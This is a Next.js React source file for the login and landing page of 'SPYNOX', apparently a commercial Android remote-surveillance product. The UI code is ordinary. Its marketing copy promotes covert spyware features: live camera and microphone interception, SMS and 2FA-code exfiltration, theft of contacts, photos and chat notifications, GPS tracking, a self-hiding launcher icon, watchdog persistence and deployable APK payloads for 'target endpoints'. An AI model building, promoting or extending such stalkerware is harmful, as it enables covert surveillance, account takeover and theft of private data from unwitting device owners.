'use client';

import React, { useState, useEffect } from 'react';
import { signIn, useSession } from 'next-auth/react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { 
    Camera, Mic, Image as ImageIcon, MessageSquare, Users, 
    Bell, Flashlight, Vibrate, MapPin, Shield, Zap, Crown, 
    Building2, Sparkles, ArrowRight, Lock, Eye, EyeOff, 
    Activity, Wifi, Smartphone, Check, Play, X, DownloadCloud,
    Terminal, Radio, Layers, Server, ShieldCheck, ChevronRight
} from 'lucide-react';
import VideoModal from '@/components/VideoModal';

export default function LoginPage() {
    const { data: session, status } = useSession();
    const router = useRouter();

    const [isLoginModalOpen, setIsLoginModalOpen] = useState(false);
    const [isVideoModalOpen, setIsVideoModalOpen] = useState(false);
    const [isLoggingIn, setIsLoggingIn] = useState(false);
    const [activeModuleIndex, setActiveModuleIndex] = useState(0);

    // Redirect if already authenticated
    useEffect(() => {
        if (status === 'authenticated') {
            router.push('/');
        }
    }, [status, router]);

    const handleGoogleSignIn = async () => {
        try {
            setIsLoggingIn(true);
            await signIn('google', { callbackUrl: '/' });
        } catch (error) {
            console.error('Sign in error:', error);
            setIsLoggingIn(false);
        }
    };

    const modules = [
        {
            id: 'camera',
            title: 'Live Optical Stream',
            desc: 'Real-time dual camera streaming with 4K RAW photo capture and night sensor mode.',
            icon: Camera,
            accent: 'text-cyan-400',
            glow: 'rgba(6,182,212,0.3)',
            badge: '4K ULTRA-HD',
            metric: '18ms Latency',
        },
        {
            id: 'audio',
            title: 'Microphone Interceptor',
            desc: 'Live high-fidelity ambient listening with background recording and VoIP routing.',
            icon: Mic,
            accent: 'text-purple-400',
            glow: 'rgba(168,85,247,0.3)',
            badge: 'HIGH-FIDELITY',
            metric: '48kHz Stereo',
        },
        {
            id: 'gallery',
            title: 'Encrypted Media Vault',
            desc: 'Access all device photos, videos, and hidden albums with single-package ZIP export.',
            icon: ImageIcon,
            accent: 'text-emerald-400',
            glow: 'rgba(16,185,129,0.3)',
            badge: 'FULL DUMP',
            metric: '100% EXIF',
        },
        {
            id: 'sms',
            title: 'SMS & Messages',
            desc: 'Complete SMS inbox/outbox exfiltration, conversation threads, and 2FA interceptor.',
            icon: MessageSquare,
            accent: 'text-rose-400',
            glow: 'rgba(244,63,94,0.3)',
            badge: 'LIVE LOGS',
            metric: 'Real-Time Sync',
        },
        {
            id: 'contacts',
            title: 'Contacts Directory',
            desc: 'Instant address book extraction with numbers, emails, addresses, and call history.',
            icon: Users,
            accent: 'text-green-400',
            glow: 'rgba(34,197,94,0.3)',
            badge: 'FULL DUMP',
            metric: 'Deep Query',
        },
        {
            id: 'notifications',
            title: 'Alerts & Chat Monitor',
            desc: 'Intercept live incoming push notifications from WhatsApp, Telegram, Instagram & SMS.',
            icon: Bell,
            accent: 'text-sky-400',
            glow: 'rgba(56,189,248,0.3)',
            badge: 'INTERCEPTOR',
            metric: 'Instant Relay',
        },
        {
            id: 'torch',
            title: 'Hardware Torch Remote',
            desc: 'Remotely toggle high-intensity LED flashlight with strobe and emergency SOS pulses.',
            icon: Flashlight,
            accent: 'text-amber-400',
            glow: 'rgba(245,158,11,0.3)',
            badge: 'HARDWARE CTRL',
            metric: 'Immediate Pulse',
        },
        {
            id: 'vibration',
            title: 'Haptic Engine Pulse',
            desc: 'Trigger custom vibration sequences and haptic feedback on target endpoints remotely.',
            icon: Vibrate,
            accent: 'text-orange-400',
            glow: 'rgba(249,115,22,0.3)',
            badge: 'HAPTIC MOTOR',
            metric: 'Custom Pattern',
        },
        {
            id: 'location',
            title: 'GPS Radar & Geofence',
            desc: 'Accurate real-time geo-coordinates, movement velocity, and visual location mapping.',
            icon: MapPin,
            accent: 'text-rose-400',
            glow: 'rgba(244,63,94,0.3)',
            badge: 'GEO-RADAR',
            metric: '±3m Precision',
        },
    ];

    const securityPillars = [
        {
            title: '100% Zero-Icon Stealth Mode',
            desc: 'Launcher icon automatically cloaks itself after activation, running completely invisible in background.',
            icon: EyeOff,
            accent: 'text-emerald-400',
        },
        {
            title: 'Persistent Watchdog Daemon',
            desc: 'Resilient watchdog services prevent task-killer terminations and ensure instant auto-restart on boot.',
            icon: Activity,
            accent: 'text-cyan-400',
        },
        {
            title: 'AES-256 Encrypted Relay',
            desc: 'All optical, audio, and file telemetry payloads are encrypted end-to-end via secure WebSocket tunnels.',
            icon: Lock,
            accent: 'text-amber-400',
        },
        {
            title: 'Zero Root Access Required',
            desc: 'Runs out of the box on standard non-rooted Android devices from Android 7.0 up to Android 15.',
            icon: ShieldCheck,
            accent: 'text-purple-400',
        },
    ];

    return (
        <div className="min-h-screen bg-[#07080a] text-white flex flex-col selection:bg-orange-500/30 selection:text-orange-300 relative overflow-x-hidden">
            
            {/* Ambient Background Glows */}
            <div className="fixed top-0 left-1/4 w-[600px] h-[600px] bg-orange-500/5 rounded-full blur-[140px] pointer-events-none" />
            <div className="fixed top-1/3 right-10 w-[500px] h-[500px] bg-purple-500/5 rounded-full blur-[140px] pointer-events-none" />
            <div className="fixed bottom-10 left-1/3 w-[600px] h-[600px] bg-cyan-500/5 rounded-full blur-[140px] pointer-events-none" />

            {/* 1. Header Navigation Bar */}
            <header className="sticky top-0 z-50 px-3 sm:px-6 py-3 bg-[#0a0b0e]/90 backdrop-blur-2xl border-b border-white/10">
                <div className="max-w-7xl mx-auto flex items-center justify-between">
                    
                    {/* Brand Logo */}
                    <div className="flex items-center gap-3">
                        <div className="clay-icon-pod w-9 h-9 sm:w-10 sm:h-10 rounded-xl sm:rounded-2xl flex items-center justify-center border-orange-500/40 shadow-[0_0_20px_rgba(249,115,22,0.3)]">
                            <Shield className="w-5 h-5 text-orange-400" />
                        </div>
                        <div className="flex flex-col">
                            <span className="text-base sm:text-lg font-black tracking-tight text-white font-mono flex items-center gap-1.5">
                                <span>SPYNOX</span>
                                <span className="text-[10px] text-orange-400 font-bold px-1.5 py-0.2 rounded bg-orange-500/10 border border-orange-500/30">v3.4</span>
                            </span>
                            <span className="text-[9px] font-mono text-white/40 uppercase tracking-widest hidden xs:block">
                                Command & Control Matrix
                            </span>
                        </div>
                    </div>

                    {/* Nav Links (Desktop) */}
                    <nav className="hidden md:flex items-center gap-6 text-xs font-mono font-bold text-white/60">
                        <a href="#modules" className="hover:text-orange-400 transition-colors">Surveillance Modules</a>
                        <a href="#stealth" className="hover:text-orange-400 transition-colors">Stealth & Defense</a>
                        <a href="#architecture" className="hover:text-orange-400 transition-colors">Architecture</a>
                        <button 
                            type="button" 
                            onClick={() => setIsVideoModalOpen(true)}
                            className="text-orange-300 hover:text-white transition-colors flex items-center gap-1.5"
                        >
                            <Play size={11} className="text-orange-400" />
                            <span>System Demo</span>
                        </button>
                    </nav>

                    {/* Enter App CTA */}
                    <button
                        type="button"
                        onClick={() => setIsLoginModalOpen(true)}
                        className="clay-cta-button px-4 sm:px-5 py-2 rounded-xl text-xs font-mono font-black uppercase tracking-wider flex items-center gap-2 shadow-[0_4px_16px_rgba(249,115,22,0.35)] cursor-pointer active:scale-95 transition-all"
                    >
                        <span>Enter Terminal</span>
                        <ArrowRight size={13} />
                    </button>
                </div>
            </header>

            {/* 2. Hero Section: High-Voltage 3D Command Deck */}
            <section className="relative pt-12 sm:pt-20 pb-16 sm:pb-24 px-4 sm:px-6">
                <div className="max-w-6xl mx-auto text-center space-y-6 sm:space-y-8">
                    
                    {/* Top Beacon Pill */}
                    <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full clay-capsule border-orange-500/40 shadow-[0_0_20px_rgba(249,115,22,0.2)]">
                        <span className="w-2 h-2 rounded-full bg-emerald-400 shadow-[0_0_8px_#10b981] animate-pulse" />
                        <span className="text-[11px] font-mono font-black uppercase tracking-wider text-orange-300">
                            SPYNOX v3.4 • Advanced Hardware Telemetry
                        </span>
                    </div>

                    {/* Hero Title */}
                    <h1 className="text-3xl sm:text-5xl md:text-6xl font-black tracking-tight leading-[1.1] max-w-4xl mx-auto">
                        <span className="text-white">Unified Remote Intelligence & </span>
                        <span className="bg-gradient-to-r from-orange-400 via-amber-300 to-yellow-500 bg-clip-text text-transparent">
                            Endpoint Control Matrix
                        </span>
                    </h1>

                    {/* Subtitle */}
                    <p className="text-xs sm:text-base text-zinc-400 max-w-2xl mx-auto font-medium leading-relaxed">
                        Next-generation real-time optical streams, audio interceptors, encrypted media vaults, and low-level hardware diagnostics across all connected Android endpoints.
                    </p>

                    {/* Dual Action CTAs */}
                    <div className="flex flex-col sm:flex-row items-center justify-center gap-3.5 pt-2">
                        <button
                            type="button"
                            onClick={() => setIsLoginModalOpen(true)}
                            className="clay-cta-button w-full sm:w-auto px-8 py-3.5 rounded-2xl text-xs sm:text-sm font-mono font-black uppercase tracking-wider flex items-center justify-center gap-2.5 shadow-[0_8px_30px_rgba(249,115,22,0.45)] cursor-pointer active:scale-95 transition-all"
                        >
                            <span>Launch Web Terminal</span>
                            <ArrowRight size={15} />
                        </button>

                        <button
                            type="button"
                            onClick={() => setIsVideoModalOpen(true)}
                            className="clay-capsule w-full sm:w-auto px-6 py-3.5 rounded-2xl text-xs sm:text-sm font-mono font-bold text-white hover:text-orange-300 hover:border-orange-500/40 flex items-center justify-center gap-2 cursor-pointer transition-all"
                        >
                            <Play size={14} className="text-orange-400" />
                            <span>Watch 1080p Walkthrough</span>
                        </button>
                    </div>

                    {/* 3D Live Surveillance HUD Preview */}
                    <div className="pt-8 sm:pt-12">
                        <div className="clay-card rounded-3xl sm:rounded-[2.5rem] p-4 sm:p-7 border border-white/15 shadow-[0_30px_90px_rgba(0,0,0,0.98)] max-w-5xl mx-auto text-left relative overflow-hidden">
                            
                            {/* HUD Top Bar */}
                            <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-4 mb-5 border-b border-white/10 gap-3">
                                <div className="flex items-center gap-3">
                                    <div className="clay-icon-pod w-10 h-10 rounded-xl flex items-center justify-center text-emerald-400 border-emerald-500/40 shrink-0">
                                        <Smartphone size={20} />
                                    </div>
                                    <div>
                                        <div className="text-xs sm:text-sm font-black text-white font-mono flex items-center gap-2">
                                            <span>SM-S928B (Galaxy S24 Ultra)</span>
                                            <span className="text-[10px] text-emerald-400 font-bold px-2 py-0.5 rounded-full bg-emerald-500/15 border border-emerald-500/30">
                                                ● LIVE ENCRYPTED
                                            </span>
                                        </div>
                                        <div className="text-[10px] font-mono text-white/40 mt-0.5">
                                            Telemetry Relay: WebSocket E2E • IP: 185.220.101.44 • Ping: 14ms
                                        </div>
                                    </div>
                                </div>

                                <div className="flex items-center gap-2 shrink-0">
                                    <div className="clay-capsule px-3 py-1 rounded-xl text-[10px] font-mono font-bold text-orange-300 border-orange-500/30">
                                        BATTERY: 94% ⚡
                                    </div>
                                    <div className="clay-capsule px-3 py-1 rounded-xl text-[10px] font-mono font-bold text-cyan-300 border-cyan-500/30">
                                        STORAGE: 512 GB
                                    </div>
                                </div>
                            </div>

                            {/* Main Surveillance Console Grid */}
                            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
                                
                                {/* 1. Simulated Live Optical Feed */}
                                <div className="lg:col-span-2 bg-[#090a0d] border border-white/10 rounded-2xl p-4 sm:p-5 relative overflow-hidden min-h-[260px] sm:min-h-[300px] flex flex-col justify-between">
                                    <div className="flex items-center justify-between z-10">
                                        <div className="flex items-center gap-2 px-2.5 py-1 rounded-full bg-black/70 border border-white/15 text-[10px] font-mono text-white">
                                            <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                                            <span>OPTICAL FEED: 1080P RAW</span>
                                        </div>
                                        <span className="text-[10px] font-mono text-cyan-400 bg-black/70 px-2.5 py-1 rounded-full border border-cyan-500/30">
                                            FPS: 60 • ZERO LATENCY
                                        </span>
                                    </div>

                                    {/* Targeting Reticle */}
                                    <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                                        <div className="w-36 h-36 border border-orange-500/30 rounded-2xl relative flex items-center justify-center">
                                            <div className="w-2 h-2 bg-orange-400 rounded-full animate-ping" />
                                            <div className="absolute top-0 left-0 w-3 h-3 border-t-2 border-l-2 border-orange-400" />
                                            <div className="absolute top-0 right-0 w-3 h-3 border-t-2 border-r-2 border-orange-400" />
                                            <div className="absolute bottom-0 left-0 w-3 h-3 border-b-2 border-l-2 border-orange-400" />
                                            <div className="absolute bottom-0 right-0 w-3 h-3 border-b-2 border-r-2 border-orange-400" />
                                        </div>
                                    </div>

                                    <div className="flex items-center justify-between z-10 pt-4 border-t border-white/5 text-[11px] font-mono text-white/50">
                                        <span>SENSOR: SONY IMX989</span>
                                        <span className="text-emerald-400 font-bold">TUNNEL SECURED</span>
                                    </div>
                                </div>

                                {/* 2. Real-Time Hardware Telemetry Matrix */}
                                <div className="space-y-3 flex flex-col justify-between">
                                    
                                    <div className="clay-capsule p-3.5 rounded-2xl space-y-1.5">
                                        <div className="flex items-center justify-between text-[10px] font-mono font-black text-white/40 uppercase tracking-wider">
                                            <span>Microphone Telemetry</span>
                                            <span className="text-purple-400">ACTIVE</span>
                                        </div>
                                        <div className="flex items-center gap-1.5 h-6">
                                            {[40, 65, 85, 30, 95, 70, 50, 80, 100, 45, 60, 75, 90, 35].map((h, i) => (
                                                <div 
                                                    key={i} 
                                                    className="flex-1 bg-gradient-to-t from-purple-600 to-indigo-400 rounded-full transition-all duration-300"
                                                    style={{ height: `${h}%` }}
                                                />
                                            ))}
                                        </div>
                                        <div className="text-[10px] font-mono text-zinc-400">48kHz Ambient Sync (VoIP Bypassed)</div>
                                    </div>

                                    <div className="clay-capsule p-3.5 rounded-2xl space-y-1.5">
                                        <div className="flex items-center justify-between text-[10px] font-mono font-black text-white/40 uppercase tracking-wider">
                                            <span>GPS Radar Fix</span>
                                            <span className="text-rose-400">LOCKED</span>
                                        </div>
                                        <div className="text-xs font-mono font-black text-white">
                                            37.7749° N, 122.4194° W
                                        </div>
                                        <div className="text-[10px] font-mono text-zinc-400">Precision: ± 2.8 meters • Speed: 0 km/h</div>
                                    </div>

                                    <div className="clay-coords-badge p-3.5 rounded-2xl flex items-center justify-between">
                                        <div className="flex items-center gap-2">
                                            <div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                                            <span className="text-xs font-mono font-black text-white">Media Vault Ready</span>
                                        </div>
                                        <span className="text-xs font-mono font-bold text-orange-400">4,218 Files</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            {/* 3. Tactical Surveillance & Control Modules Grid */}
            <section id="modules" className="py-16 sm:py-24 px-4 sm:px-6 border-t border-white/5 bg-[#090a0d]/60 relative">
                <div className="max-w-6xl mx-auto space-y-12">
                    
                    {/* Section Header */}
                    <div className="text-center space-y-3">
                        <div className="clay-pill-amber inline-block px-3 py-1 text-[10px] font-mono font-black uppercase tracking-wider text-amber-300">
                            TACTICAL CAPABILITIES
                        </div>
                        <h2 className="text-2xl sm:text-4xl font-black text-white tracking-tight">
                            9 High-Voltage Surveillance & Hardware Modules
                        </h2>
                        <p className="text-xs sm:text-sm text-zinc-400 max-w-xl mx-auto font-medium">
                            Comprehensive low-level Android sensor exfiltration and hardware control modules built for speed.
                        </p>
                    </div>

                    {/* 9 Modules Grid */}
                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-5">
                        {modules.map((mod, idx) => {
                            const IconComponent = mod.icon;
                            return (
                                <div 
                                    key={mod.id}
                                    className="clay-card p-5 sm:p-6 rounded-3xl border border-white/10 hover:border-orange-500/40 transition-all duration-300 flex flex-col justify-between group shadow-[0_15px_40px_rgba(0,0,0,0.85)] hover:-translate-y-1"
                                >
                                    <div>
                                        <div className="flex items-center justify-between mb-4">
                                            <div 
                                                className={`clay-icon-pod w-12 h-12 rounded-2xl flex items-center justify-center ${mod.accent}`}
                                                style={{ boxShadow: `0 0 20px ${mod.glow}` }}
                                            >
                                                <IconComponent size={22} />
                                            </div>
                                            <span className="clay-capsule px-2.5 py-1 rounded-xl text-[9px] font-mono font-black text-white/50 border-white/10 uppercase tracking-wider">
                                                {mod.badge}
                                            </span>
                                        </div>

                                        <h3 className="text-base font-black text-white mb-2 tracking-tight group-hover:text-orange-300 transition-colors">
                                            {mod.title}
                                        </h3>
                                        <p className="text-xs text-zinc-400 leading-relaxed font-medium mb-4">
                                            {mod.desc}
                                        </p>
                                    </div>

                                    <div className="pt-3 border-t border-white/5 flex items-center justify-between text-[10px] font-mono">
                                        <span className="text-white/40">Telemetry Spec</span>
                                        <span className="text-emerald-400 font-bold">{mod.metric}</span>
                                    </div>
                                </div>
                            );
                        })}
                    </div>
                </div>
            </section>

            {/* 4. Enterprise Stealth & Defense Pillars */}
            <section id="stealth" className="py-16 sm:py-24 px-4 sm:px-6 border-t border-white/5 relative">
                <div className="max-w-6xl mx-auto space-y-12">
                    
                    <div className="text-center space-y-3">
                        <div className="clay-pill-emerald inline-block px-3 py-1 text-[10px] font-mono font-black uppercase tracking-wider text-emerald-300">
                            STEALTH & PERSISTENCE
                        </div>
                        <h2 className="text-2xl sm:text-4xl font-black text-white tracking-tight">
                            Engineered for Total Invisibility
                        </h2>
                        <p className="text-xs sm:text-sm text-zinc-400 max-w-xl mx-auto font-medium">
                            Military-grade background persistence and stealth execution without leaving digital footprints.
                        </p>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 sm:gap-6">
                        {securityPillars.map((p, idx) => {
                            const IconComp = p.icon;
                            return (
                                <div key={idx} className="clay-capsule p-6 rounded-3xl border border-white/10 flex items-start gap-4">
                                    <div className={`clay-icon-pod w-12 h-12 rounded-2xl flex items-center justify-center shrink-0 ${p.accent}`}>
                                        <IconComp size={22} />
                                    </div>
                                    <div className="space-y-1.5">
                                        <h3 className="text-sm sm:text-base font-black text-white tracking-tight">{p.title}</h3>
                                        <p className="text-xs text-zinc-400 leading-relaxed font-medium">{p.desc}</p>
                                    </div>
                                </div>
                            );
                        })}
                    </div>
                </div>
            </section>

            {/* 5. Pricing CTA Section */}
            <section id="architecture" className="py-16 sm:py-24 px-4 sm:px-6 border-t border-white/5 bg-[#090a0d]/80 text-center relative">
                <div className="max-w-4xl mx-auto space-y-6">
                    <div className="clay-icon-pod w-14 h-14 rounded-3xl flex items-center justify-center text-orange-400 mx-auto border-orange-500/40 shadow-[0_0_30px_rgba(249,115,22,0.4)]">
                        <Terminal size={28} />
                    </div>
                    
                    <h2 className="text-2xl sm:text-4xl font-black text-white tracking-tight">
                        Ready to Take Control of Your Endpoints?
                    </h2>
                    
                    <p className="text-xs sm:text-sm text-zinc-400 max-w-lg mx-auto font-medium">
                        Deploy customized APK binaries, pair devices seamlessly, and view full real-time surveillance streams instantly.
                    </p>

                    <div className="pt-3 flex justify-center">
                        <button
                            type="button"
                            onClick={() => setIsLoginModalOpen(true)}
                            className="clay-cta-button px-8 py-3.5 rounded-2xl font-mono font-black text-xs sm:text-sm uppercase tracking-wider flex items-center gap-2 shadow-[0_8px_30px_rgba(249,115,22,0.5)] cursor-pointer active:scale-95 transition-all"
                        >
                            <span>Access Spynox Command Center</span>
                            <ArrowRight size={15} />
                        </button>
                    </div>
                </div>
            </section>

            {/* 6. Footer */}
            <footer className="py-8 px-4 sm:px-6 border-t border-white/10 text-center text-[11px] font-mono text-white/40 space-y-2">
                <div className="flex items-center justify-center gap-2">
                    <Shield size={14} className="text-orange-400" />
                    <span className="font-bold text-white">SPYNOX SECURITY & TELEMETRY</span>
                </div>
                <p>© 2026 Spynox Technologies. All rights reserved. Enterprise-grade surveillance architecture.</p>
            </footer>

            {/* ─── 3D Claymorphic Login Modal ─── */}
            {isLoginModalOpen && (
                <div 
                    className="fixed inset-0 z-[1000] flex items-center justify-center p-4 bg-black/85 backdrop-blur-xl animate-in fade-in duration-100"
                    onClick={() => setIsLoginModalOpen(false)}
                >
                    <div 
                        className="clay-card relative w-full max-w-sm p-6 sm:p-8 rounded-[2.5rem] border border-white/15 shadow-[0_30px_100px_rgba(0,0,0,0.98)] text-center animate-in zoom-in-95 duration-100"
                        onClick={(e) => e.stopPropagation()}
                    >
                        {/* Close X */}
                        <button
                            type="button"
                            onClick={() => setIsLoginModalOpen(false)}
                            className="clay-button-sm absolute top-4 right-4 w-8 h-8 rounded-xl flex items-center justify-center text-white/60 hover:text-white transition-all cursor-pointer z-10"
                        >
                            <X size={15} />
                        </button>

                        {/* Brand Icon Pod */}
                        <div className="clay-icon-pod w-16 h-16 rounded-3xl flex items-center justify-center text-orange-400 border-orange-500/40 mx-auto mb-4 shadow-[0_0_30px_rgba(249,115,22,0.35)]">
                            <Shield size={30} />
                        </div>

                        <h3 className="text-lg sm:text-xl font-black text-white tracking-tight mb-1 font-mono">
                            SPYNOX COMMAND
                        </h3>
                        <p className="text-xs text-zinc-400 font-medium mb-6">
                            Authenticate with your verified operator account
                        </p>

                        {/* Google Sign In Button */}
                        <button
                            type="button"
                            onClick={handleGoogleSignIn}
                            disabled={isLoggingIn}
                            className="w-full py-3.5 px-4 rounded-2xl bg-white hover:bg-zinc-100 text-black font-extrabold text-xs sm:text-sm flex items-center justify-center gap-3 transition-all shadow-[0_4px_20px_rgba(255,255,255,0.2)] active:scale-95 cursor-pointer disabled:opacity-60"
                        >
                            <svg className="w-4 h-4" viewBox="0 0 24 24">
                                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" />
                                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" />
                            </svg>
                            <span>{isLoggingIn ? 'Authenticating...' : 'Sign in with Google'}</span>
                        </button>

                        <div className="mt-4 pt-3 border-t border-white/5 text-[10px] font-mono text-white/30">
                            Protected by AES-256 E2E Encryption
                        </div>
                    </div>
                </div>
            )}

            {/* Video Tutorial Modal */}
            <VideoModal
                isOpen={isVideoModalOpen}
                onClose={() => setIsVideoModalOpen(false)}
                videoUrl="/video/gallery-eye-tutorial.mp4"
            />
        </div>
    );
}
